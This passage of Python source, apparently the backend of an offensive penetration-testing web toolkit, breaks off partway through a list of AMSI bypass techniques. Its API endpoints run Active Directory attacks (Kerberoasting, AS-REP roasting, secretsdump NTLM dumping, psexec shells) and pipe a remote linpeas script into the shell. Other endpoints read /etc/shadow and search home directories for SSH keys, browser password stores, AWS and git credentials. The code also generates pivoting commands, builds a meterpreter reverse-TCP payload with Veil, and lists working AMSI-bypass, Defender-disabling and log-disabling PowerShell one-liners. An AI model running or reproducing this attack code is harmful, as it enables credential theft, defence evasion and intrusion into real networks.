            findings.append({"severity": "CRITICAL", "title": "WPA Key Found", "detail": line.strip()})
        elif "failed" in line.lower():
            findings.append({"severity": "INFO", "title": "Crack Failed", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Aircrack-ng result", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": capfile, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Crack attempt complete"}


# ─────────────────────────────────────────────────────────────
# ACTIVE DIRECTORY
# ─────────────────────────────────────────────────────────────

@app.post("/api/ad/enum")
async def ad_enum(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    dc_ip = opts.get("dc_ip", req.target)
    domain = opts.get("domain", "domain.com")
    base_dn = "DC=" + domain.replace(".", ",DC=")
    r1 = await run_tool(["enum4linux-ng", "-A", req.target], timeout=60)
    r2 = await run_tool(["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base_dn], timeout=30)
    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "user" in ll and "account" in ll:
            findings.append({"severity": "MEDIUM", "title": "User Account Found", "detail": line.strip()})
        elif "share" in ll:
            findings.append({"severity": "HIGH", "title": "Share Discovered", "detail": line.strip()})
        elif "password policy" in ll:
            findings.append({"severity": "HIGH", "title": "Password Policy", "detail": line.strip()})
        elif "group" in ll and len(findings) < 30:
            findings.append({"severity": "INFO", "title": "Group Entry", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "AD Enum complete", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} AD finding(s)"}


@app.post("/api/ad/kerberoast")
async def ad_kerberoast(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    domain = opts.get("domain", ""); username = opts.get("username", ""); password = opts.get("password", "")
    dc_ip = opts.get("dc_ip", req.target)
    if not domain or not username:
        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Domain and Username first",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    result = await run_tool(
        ["impacket-GetUserSPNs", f"{domain}/{username}:{password}@{dc_ip}", "-request", "-outputfile", "/tmp/spns.txt"],
        timeout=60)
    raw = result["output"] + result.get("error","")
    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
    if conn_err:
        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
                "message":f"❌ Cannot reach DC at {dc_ip} — check target IP and that port 88/445 is open",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    findings = []
    for line in raw.splitlines():
        if "$krb5tgs$" in line:
            findings.append({"severity":"CRITICAL","title":"Kerberoastable Hash","detail":line[:120]})
        elif "serviceprincipalname" in line.lower() and "@" in line:
            findings.append({"severity":"HIGH","title":"SPN Found","detail":line.strip()[:100]})
    msg = f"✅ {len(findings)} kerberoastable SPN(s) found" if findings else "No kerberoastable SPNs — all accounts require pre-auth or no SPNs set"
    return {"scan_id":scan_id,"target":dc_ip,"findings":findings,"raw_output":raw,
            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}


@app.post("/api/ad/asreproast")
async def ad_asreproast(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    domain = opts.get("domain",""); username = opts.get("username","")
    dc_ip = opts.get("dc_ip", req.target)
    if not domain:
        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Domain first",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    users_file = f"/tmp/asrep_{uuid.uuid4().hex[:6]}.txt"
    with open(users_file,"w") as f: f.write((username or "Administrator")+"\n")
    result = await run_tool(
        ["impacket-GetNPUsers", f"{domain}/","-usersfile",users_file,"-no-pass","-dc-ip",dc_ip], timeout=60)
    raw = result["output"] + result.get("error","")
    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
    if conn_err:
        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
                "message":f"❌ Cannot reach DC at {dc_ip} — not a Windows AD server",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    findings = []
    for line in raw.splitlines():
        if "$krb5asrep$" in line:
            findings.append({"severity":"CRITICAL","title":"AS-REP Hash Captured","detail":line[:120]})
    msg = f"✅ {len(findings)} AS-REP hash(es) captured" if findings else "No AS-REP hashes — all accounts require pre-authentication"
    return {"scan_id":scan_id,"target":dc_ip,"findings":findings,"raw_output":raw,
            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}


@app.post("/api/ad/bloodhound")
async def ad_bloodhound(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    username = opts.get("username", "user")
    password = opts.get("password", "password")
    domain = opts.get("domain", "domain.com")
    dc_ip = opts.get("dc_ip", req.target)
    os.makedirs("/tmp/bh_out", exist_ok=True)
    result = await run_tool(
        ["bloodhound-python", "-u", username, "-p", password, "-d", domain,
         "-dc", dc_ip, "-c", "All", "--zip", "-o", "/tmp/bh_out/"],
        timeout=120
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "done" in ll and "collecting" in ll:
            findings.append({"severity": "HIGH", "title": "Collection Complete", "detail": line.strip()})
        elif "error" in ll:
            findings.append({"severity": "MEDIUM", "title": "Collection Error", "detail": line.strip()})
        elif "zip" in ll:
            findings.append({"severity": "INFO", "title": "Output Archive", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "BloodHound result", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": domain, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "BloodHound collection finished"}


@app.post("/api/ad/secretsdump")
async def ad_secretsdump(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    domain = opts.get("domain", "domain.com")
    username = opts.get("username", "user")
    password = opts.get("password", "password")
    result = await run_tool(
        ["impacket-secretsdump", f"{domain}/{username}:{password}@{req.target}"],
        timeout=60
    )
    raw = result["output"] + result.get("error","")
    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
    if conn_err:
        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
                "message":f"❌ Cannot reach {req.target} — not a Windows AD server or SMB not accessible",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    findings = []
    for line in raw.splitlines():
        if ":::" in line and len(line.split(":")) >= 4:
            user = line.split(":")[0]
            sev = "CRITICAL" if user.lower() in ("administrator","root","admin") else "HIGH"
            findings.append({"severity":sev,"title":"NTLM Hash Dumped","detail":line.strip()[:120]})
    msg = f"✅ {len(findings)} NTLM hash(es) dumped" if findings else "❌ No hashes — check credentials or target is not a DC"
    return {"scan_id":scan_id,"target":req.target,"findings":findings,"raw_output":raw,
            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}


@app.post("/api/ad/psexec")
async def ad_psexec(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    domain = opts.get("domain",""); username = opts.get("username",""); password = opts.get("password","")
    if not username:
        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Username first",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    result = await run_tool(
        ["impacket-psexec", f"{domain}/{username}:{password}@{req.target}", "whoami"], timeout=30)
    raw = result["output"] + result.get("error","")
    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
    if conn_err:
        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
                "message":f"❌ Cannot reach {req.target} on SMB — target is not a Windows machine",
                "timestamp":datetime.datetime.utcnow().isoformat()}
    shell_obtained = any(k in raw.lower() for k in ["nt authority\\system","administrator","smb"])
    findings = [{"severity":"CRITICAL" if shell_obtained else "MEDIUM",
                 "title":"Shell obtained via PsExec" if shell_obtained else "PsExec failed",
                 "detail":raw.strip()[:200]}] if raw.strip() else []
    return {"scan_id":scan_id,"target":req.target,"findings":findings,"raw_output":raw,
            "timestamp":datetime.datetime.utcnow().isoformat(),
            "message":"✅ Shell obtained!" if shell_obtained else "❌ Shell not obtained — check credentials"}


# ─────────────────────────────────────────────────────────────
# PRIVILEGE ESCALATION
# ─────────────────────────────────────────────────────────────

_GTFO_SUID = {"python", "python3", "perl", "ruby", "bash", "vim", "find", "nmap",
              "awk", "less", "more", "man", "wget", "nc", "netcat", "php", "lua",
              "tclsh", "node", "env", "dash", "sh"}

@app.post("/api/privesc/linpeas")
async def privesc_linpeas(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    if os.path.exists("/tmp/linpeas.sh"):
        result = await run_tool(["sh", "/tmp/linpeas.sh"], timeout=120)
    else:
        result = await run_tool(
            ["sh", "-c", "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"],
            timeout=120
        )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        stripped = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
        if not stripped:
            continue
        if "\x1b[1;31m" in line or "CRITICAL" in line:
            findings.append({"severity": "CRITICAL", "title": "LinPEAS Critical", "detail": stripped})
        elif "\x1b[1;33m" in line or "[+]" in line:
            findings.append({"severity": "HIGH", "title": "LinPEAS High", "detail": stripped})
        elif "\x1b[1;32m" in line:
            findings.append({"severity": "INFO", "title": "LinPEAS Info", "detail": stripped})
        if len(findings) >= 50:
            break
    if not findings:
        findings.append({"severity": "INFO", "title": "LinPEAS output", "detail": raw[:600]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw[:3000],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} findings from linpeas"}


@app.post("/api/privesc/linux_suggest")
async def privesc_linux_suggest(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    script = "/tmp/linux-exploit-suggester.py" if os.path.exists("/tmp/linux-exploit-suggester.py") else "les.py"
    result = await run_tool(["python3", script], timeout=60)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        if re.search(r'CVE-\d{4}-\d+', line, re.I):
            cve = re.search(r'CVE-\d{4}-\d+', line, re.I).group()
            findings.append({"severity": "HIGH", "title": f"Kernel Exploit Suggestion: {cve}", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No suggestions or tool missing", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} CVE(s) suggested"}


@app.post("/api/privesc/suid")
async def privesc_suid(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(["find", "/", "-perm", "-4000", "-type", "f"], timeout=30)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        binary = os.path.basename(line).lower()
        if binary in _GTFO_SUID:
            findings.append({"severity": "CRITICAL", "title": f"SUID GTFOBin: {binary}", "detail": line})
        else:
            findings.append({"severity": "MEDIUM", "title": f"SUID Binary: {binary}", "detail": line})
    if not findings:
        findings.append({"severity": "INFO", "title": "No SUID binaries found", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} SUID file(s) found"}


@app.post("/api/privesc/sudo")
async def privesc_sudo(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(["sudo", "-l"], timeout=15)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.lower().strip()
        if "may run" in ll or "nopasswd" in ll or "(all)" in ll:
            exploitable = any(b in ll for b in _GTFO_SUID)
            sev = "CRITICAL" if exploitable else "HIGH"
            findings.append({"severity": sev, "title": "Sudo Permission", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Sudo output", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} sudo rule(s)"}


@app.post("/api/privesc/capabilities")
async def privesc_capabilities(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(["getcap", "-r", "/"], timeout=30)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "cap_setuid" in ll or "cap_sys_admin" in ll:
            findings.append({"severity": "CRITICAL", "title": "Dangerous Capability", "detail": line.strip()})
        elif "cap_" in ll:
            findings.append({"severity": "MEDIUM", "title": "Capability Found", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No dangerous capabilities", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} capability entry(ies)"}


@app.post("/api/privesc/cron")
async def privesc_cron(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["sh", "-c", "cat /etc/crontab; ls -la /etc/cron.*; find /var/spool/cron -readable 2>/dev/null"],
        timeout=15
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.strip()
        if not ll or ll.startswith("#"):
            continue
        if re.search(r'\*.*\*.*\*', ll):
            findings.append({"severity": "MEDIUM", "title": "Cron Job Entry", "detail": ll})
        if "rwx" in ll or "rw-rw-rw" in ll:
            findings.append({"severity": "HIGH", "title": "World-Writable Cron Script", "detail": ll})
    if not findings:
        findings.append({"severity": "INFO", "title": "Cron output", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} cron entry(ies)"}


# ─────────────────────────────────────────────────────────────
# PIVOTING & TUNNELING
# ─────────────────────────────────────────────────────────────

@app.post("/api/tunnel/chisel")
async def tunnel_chisel(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 8080)
    mode = opts.get("mode", "socks5")
    if mode == "socks5":
        server_cmd = f"chisel server -p {lport} --reverse --socks5"
        client_cmd = f"chisel client {lhost}:{lport} R:socks"
        socks_cmd = f"proxychains4 -f /etc/proxychains4.conf <command>"
    else:
        rport = opts.get("rport", 3389)
        server_cmd = f"chisel server -p {lport} --reverse"
        client_cmd = f"chisel client {lhost}:{lport} R:{rport}:127.0.0.1:{rport}"
        socks_cmd = f"Connect to 127.0.0.1:{rport} on attacker"
    findings = [
        {"severity": "INFO", "title": "Chisel Server Command", "detail": server_cmd},
        {"severity": "INFO", "title": "Chisel Client Command (run on victim)", "detail": client_cmd},
        {"severity": "INFO", "title": "Usage", "detail": socks_cmd},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings,
            "raw_output": f"{server_cmd}\n{client_cmd}\n{socks_cmd}",
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Chisel commands generated"}


@app.post("/api/tunnel/socat")
async def tunnel_socat(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "0.0.0.0")
    lport = opts.get("lport", 4444)
    rhost = opts.get("rhost", req.target)
    rport = opts.get("rport", 80)
    relay_cmd = f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{rhost}:{rport}"
    tty_cmd = f"socat file:`tty`,raw,echo=0 TCP:{rhost}:{rport}"
    pivot_cmd = f"socat TCP-LISTEN:{lport},fork TCP:{rhost}:{rport} &"
    findings = [
        {"severity": "INFO", "title": "Port Relay", "detail": relay_cmd},
        {"severity": "INFO", "title": "TTY Upgrade", "detail": tty_cmd},
        {"severity": "INFO", "title": "Pivot Relay (background)", "detail": pivot_cmd},
    ]
    raw = "\n".join([relay_cmd, tty_cmd, pivot_cmd])
    return {"scan_id": scan_id, "target": rhost, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Socat commands generated"}


@app.post("/api/tunnel/ssh")
async def tunnel_ssh(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    ttype = opts.get("type", "dynamic")
    lport = opts.get("lport", 1080)
    rhost = opts.get("rhost", req.target)
    rport = opts.get("rport", 80)
    user = opts.get("user", "user")
    if ttype == "local":
        cmd = f"ssh -L {lport}:{rhost}:{rport} {user}@{rhost} -N -f"
        desc = f"Forward local port {lport} to {rhost}:{rport}"
    elif ttype == "remote":
        cmd = f"ssh -R {rport}:localhost:{lport} {user}@{rhost} -N -f"
        desc = f"Expose local port {lport} on remote as {rport}"
    else:
        cmd = f"ssh -D {lport} {user}@{rhost} -N -f"
        desc = f"SOCKS5 proxy on localhost:{lport}"
    findings = [
        {"severity": "INFO", "title": f"SSH {ttype.title()} Tunnel", "detail": cmd},
        {"severity": "INFO", "title": "Explanation", "detail": desc},
    ]
    return {"scan_id": scan_id, "target": rhost, "findings": findings, "raw_output": cmd,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "SSH tunnel command generated"}


@app.post("/api/tunnel/proxychains")
async def tunnel_proxychains(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    proxy_type = opts.get("proxy_type", "socks5")
    proxy_ip = opts.get("proxy_ip", "127.0.0.1")
    proxy_port = opts.get("proxy_port", 1080)
    conf_path = "/tmp/proxychains_gen.conf"
    conf_content = (
        "strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\n"
        f"tcp_connect_time_out 8000\n[ProxyList]\n{proxy_type} {proxy_ip} {proxy_port}\n"
    )
    try:
        with open(conf_path, "w") as f:
            f.write(conf_content)
        written = True
    except Exception:
        written = False
    usage = f"proxychains4 -f {conf_path} nmap -sT -Pn <target>"
    findings = [
        {"severity": "INFO", "title": "Config Written" if written else "Config (not written)", "detail": conf_path},
        {"severity": "INFO", "title": "Proxychains Config", "detail": conf_content.strip()},
        {"severity": "INFO", "title": "Usage Example", "detail": usage},
    ]
    return {"scan_id": scan_id, "target": proxy_ip, "findings": findings, "raw_output": conf_content,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Proxychains config generated"}


@app.post("/api/tunnel/ligolo")
async def tunnel_ligolo(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 11601)
    agent_cmd = f"./agent -connect {lhost}:{lport} -ignore-cert"
    proxy_cmd = f"./proxy -selfcert -laddr 0.0.0.0:{lport}"
    iface_setup = (
        "# On proxy (attacker):\n"
        "sudo ip tuntap add user $(whoami) mode tun ligolo\n"
        "sudo ip link set ligolo up\n"
        "# In ligolo console after agent connects:\n"
        "session\ntunnel_start\n"
        "# Add route to pivot network (e.g.):\n"
        "sudo ip route add 192.168.1.0/24 dev ligolo"
    )
    findings = [
        {"severity": "INFO", "title": "Ligolo Proxy (attacker)", "detail": proxy_cmd},
        {"severity": "INFO", "title": "Ligolo Agent (victim)", "detail": agent_cmd},
        {"severity": "INFO", "title": "Interface Setup", "detail": iface_setup},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings,
            "raw_output": f"{proxy_cmd}\n{agent_cmd}\n{iface_setup}",
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Ligolo-ng commands generated"}


# ─────────────────────────────────────────────────────────────
# POST EXPLOITATION
# ─────────────────────────────────────────────────────────────

@app.post("/api/post/hashdump")
async def post_hashdump(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["sh", "-c", "cat /etc/passwd; cat /etc/shadow 2>/dev/null; cat /etc/shadow- 2>/dev/null"],
        timeout=15
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        parts = line.split(":")
        if len(parts) < 2:
            continue
        user = parts[0]
        pw_field = parts[1] if len(parts) > 1 else ""
        has_hash = pw_field not in ("", "x", "*", "!", "!!", "locked")
        if has_hash:
            sev = "CRITICAL" if user in ("root", "admin", "sudo") else "HIGH"
            findings.append({"severity": sev, "title": f"Hash for: {user}", "detail": line.strip()})
        elif user and not user.startswith("#"):
            findings.append({"severity": "INFO", "title": f"User: {user}", "detail": line.strip()})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} entry(ies) parsed"}


@app.post("/api/post/creds")
async def post_creds(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    pattern = r"password\|passwd\|secret\|api_key\|token"
    result = await run_tool(
        ["sh", "-c",
         f"grep -rl '{pattern}' /home /var/www /opt /etc/*.conf 2>/dev/null"],
        timeout=30
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        line = line.strip()
        if line:
            ext = os.path.splitext(line)[-1].lower()
            sev = "CRITICAL" if ext in (".env", ".conf") else "HIGH"
            findings.append({"severity": sev, "title": "Credential File Found", "detail": line})
    if not findings:
        findings.append({"severity": "INFO", "title": "No credential files found", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} file(s) with creds"}


@app.post("/api/post/persistence_check")
async def post_persistence_check(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    cmd = (
        "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; "
        "systemctl list-units --type=service --state=running 2>/dev/null | tail -30; "
        "cat ~/.bashrc 2>/dev/null | grep -v '^#'; "
        "cat /etc/rc.local 2>/dev/null; "
        "find / -perm -4000 -newer /tmp -type f 2>/dev/null; "
        "cat ~/.ssh/authorized_keys 2>/dev/null"
    )
    result = await run_tool(["sh", "-c", cmd], timeout=30)
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.lower().strip()
        if not ll:
            continue
        if "authorized_keys" in ll or "ssh-rsa" in ll or "ssh-ed25519" in ll:
            findings.append({"severity": "CRITICAL", "title": "Authorized Key Present", "detail": line.strip()})
        elif re.search(r'\*.*\*.*\*', ll):
            findings.append({"severity": "HIGH", "title": "Cron Persistence", "detail": line.strip()})
        elif ".service" in ll and "running" in ll:
            findings.append({"severity": "MEDIUM", "title": "Running Service", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Persistence check output", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} indicator(s)"}


@app.post("/api/post/network_enum")
async def post_network_enum(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["sh", "-c", "ss -tulnp; ip route; arp -a; cat /etc/hosts"],
        timeout=15
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        ll = line.strip()
        if not ll or ll.startswith("#"):
            continue
        if re.search(r'LISTEN|ESTABLISHED', ll):
            findings.append({"severity": "MEDIUM", "title": "Open Port / Connection", "detail": ll})
        elif re.search(r'\d+\.\d+\.\d+\.\d+', ll) and ("via" in ll or "dev" in ll):
            findings.append({"severity": "INFO", "title": "Route Entry", "detail": ll})
        elif "arp" in ll.lower() or "(" in ll:
            findings.append({"severity": "INFO", "title": "ARP Entry", "detail": ll})
    if not findings:
        findings.append({"severity": "INFO", "title": "Network enum output", "detail": raw[:500]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} network entries"}


@app.post("/api/post/loot")
async def post_loot(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    cmd = (
        "find /home /root -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null; "
        "find /home /root -name '.gnupg' -type d 2>/dev/null; "
        "find /home /root -name 'Login Data' -o -name 'key4.db' 2>/dev/null; "
        "find /home /root -name '.git-credentials' 2>/dev/null; "
        "find /home /root -name 'credentials' -path '*/.aws/*' 2>/dev/null; "
        "find /home /root -name '*.kdbx' -o -name '*.1password' 2>/dev/null"
    )
    result = await run_tool(["sh", "-c", cmd], timeout=20)
    raw = result["output"] + result.get("error","")
    findings = []
    loot_map = {
        "id_rsa": ("CRITICAL", "SSH Private Key"),
        ".pem": ("HIGH", "PEM Certificate/Key"),
        ".key": ("HIGH", "Key File"),
        ".gnupg": ("HIGH", "GPG Keyring"),
        "Login Data": ("HIGH", "Browser Saved Passwords"),
        "key4.db": ("HIGH", "Firefox Key Database"),
        ".git-credentials": ("CRITICAL", "Git Credentials"),
        "credentials": ("CRITICAL", "AWS Credentials"),
        ".kdbx": ("CRITICAL", "KeePass Database"),
    }
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        for key, (sev, title) in loot_map.items():
            if key in line:
                findings.append({"severity": sev, "title": title, "detail": line})
                break
        else:
            findings.append({"severity": "INFO", "title": "Loot File", "detail": line})
    if not findings:
        findings.append({"severity": "INFO", "title": "No loot found", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} loot file(s)"}


# ─────────────────────────────────────────────────────────────
# ANTIVIRUS EVASION
# ─────────────────────────────────────────────────────────────

@app.post("/api/av/check")
async def av_check(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["sh", "-c", "ps aux | grep -iE 'av|antivirus|defender|sentinel|crowdstrike|carbon|symantec|mcafee|eset'"],
        timeout=10
    )
    raw = result["output"] + result.get("error","")
    av_paths = ["/opt/sophos-av", "/opt/CrowdStrike", "/opt/carbonblack", "/etc/clamav"]
    path_findings = [p for p in av_paths if os.path.exists(p)]
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "grep" in ll:
            continue
        if any(av in ll for av in ["defender", "sentinel", "crowdstrike", "carbon", "symantec", "mcafee"]):
            findings.append({"severity": "CRITICAL", "title": "AV Process Detected", "detail": line.strip()})
        elif "clamav" in ll or "clamscan" in ll:
            findings.append({"severity": "HIGH", "title": "ClamAV Detected", "detail": line.strip()})
    for p in path_findings:
        findings.append({"severity": "HIGH", "title": "AV Installation Path", "detail": p})
    if not findings:
        findings.append({"severity": "INFO", "title": "No AV detected", "detail": "No common AV processes or paths found"})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} AV indicator(s)"}


@app.post("/api/av/veil")
async def av_veil(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", "10.10.10.10")
    lport = opts.get("lport", 4444)
    os.makedirs("/tmp/veil_out", exist_ok=True)
    r1 = await run_tool(["veil", "--list-payloads"], timeout=20)
    r2 = await run_tool(
        ["veil", "-t", "Evasion", "-p", "powershell/meterpreter/rev_tcp.py",
         "--ip", str(lhost), "--port", str(lport), "--output-dir", "/tmp/veil_out"],
        timeout=60
    )
    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
    findings = []
    for line in raw.splitlines():
        ll = line.lower()
        if "compiled" in ll or "generated" in ll or "output" in ll:
            findings.append({"severity": "HIGH", "title": "Veil Payload Generated", "detail": line.strip()})
        elif "payload" in ll and "/" in line:
            findings.append({"severity": "MEDIUM", "title": "Payload Listed", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Veil result", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Veil run complete"}


@app.post("/api/av/amsi_bypass")
async def av_amsi_bypass(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    techniques = [
        {
            "severity": "CRITICAL", "title": "AMSI Patch (Memory)",
            "detail": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        },
        {
            "severity": "CRITICAL", "title": "AMSI Disable Real-Time",
            "detail": "Set-MpPreference -DisableRealtimeMonitoring $true"
        },
        {
            "severity": "HIGH", "title": "AMSI Context Corruption",
            "detail": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext','NonPublic,Static');$c=$b.GetValue($null);[Runtime.InteropServices.Marshal]::WriteByte($c,0x16)"
        },
        {
            "severity": "HIGH", "title": "Disable ScriptBlock Logging",
            "detail": "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0"
        },
        {
            "severity": "MEDIUM", "title": "AMSI Force Error via Reflection",
